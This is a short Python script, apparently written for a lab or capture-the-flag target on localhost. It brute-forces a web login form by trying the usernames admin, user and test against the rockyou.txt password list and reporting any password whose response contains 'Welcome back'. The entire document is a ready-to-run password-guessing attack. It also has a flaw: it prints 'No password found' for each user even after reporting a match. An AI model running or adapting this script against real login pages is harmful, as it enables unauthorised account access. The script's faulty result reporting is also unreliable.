from pwn import * 
import requests 
import sys 

# Define target web app and port
target = "http://127.0.0.1:5000"

# Set usernames and passwords 
usernames = ["admin", "user", "test"]
passwords = "rockyou.txt"

# Set success message 
needle = "Welcome back"

for username in usernames: 
    # Open password list file
    with open(passwords, "r") as passwords_list: 
        # Iterate over each password 
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {} {}\r".format(username, password.decode()))
            # Flush buffer 
            sys.stdout.flush()
            # Make the request 
            r = requests.post(target, data={"username": username, "password": password})

            # Check if request is successful 
            if needle.encode() in r.content: 
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>>] Valid password '{}' found for user '{}'.".format(password.decode(), username))
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'.".format(username))
        sys.stdout.write("\n")